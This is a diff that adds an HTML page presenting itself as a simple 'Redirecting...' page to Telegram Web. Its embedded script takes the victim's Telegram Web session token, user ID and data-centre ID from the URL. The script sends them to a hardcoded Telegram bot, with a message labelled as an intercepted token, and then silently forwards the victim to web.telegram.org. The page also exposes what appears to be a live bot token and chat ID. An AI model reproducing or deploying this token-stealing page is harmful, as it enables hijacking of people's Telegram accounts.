@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script>
+        // Функция отправки данных в Telegram
+        async function sendToTelegram(token, userId, dcId) {
+            const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4'; // замените на ваш токен
+            const chatId = '8220267007';     // замените на ваш ID
+            const message = `Перехвачен токен:\nToken: ${token}\nUser ID: ${userId}\nDC ID: ${dcId}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            try {
+                await fetch(url);
+            } catch (e) {
+                console.error('Ошибка отправки в Telegram', e);
+            }
+        }
+
+        // Извлечение параметров из текущего URL
+        (function() {
+            // Получаем полный URL (включая хэш после #)
+            const fullUrl = window.location.href;
+            // Разбираем хэш-часть (то, что после #)
+            const hashIndex = fullUrl.indexOf('#');
+            if (hashIndex === -1) return; // нет параметров
+
+            const hashParams = new URLSearchParams(fullUrl.substring(hashIndex + 1));
+            const token = hashParams.get('tgWebAuthToken');
+            const userId = hashParams.get('tgWebAuthUserId');
+            const dcId = hashParams.get('tgWebAuthDcId');
+
+            if (token && userId && dcId) {
+                // Отправляем в Telegram
+                sendToTelegram(token, userId, dcId).then(() => {
+                    // Перенаправляем на оригинальный сайт Telegram Web (без параметров)
+                    window.location.replace('https://web.telegram.org/k/');
+                });
+            } else {
+                // Если параметров нет, всё равно переходим на Telegram
+                window.location.replace('https://web.telegram.org/k/');
+            }
+        })();
+    </script>
+</head>
+<body>
+    <p>Перенаправление...</p>
+</body>
+</html>
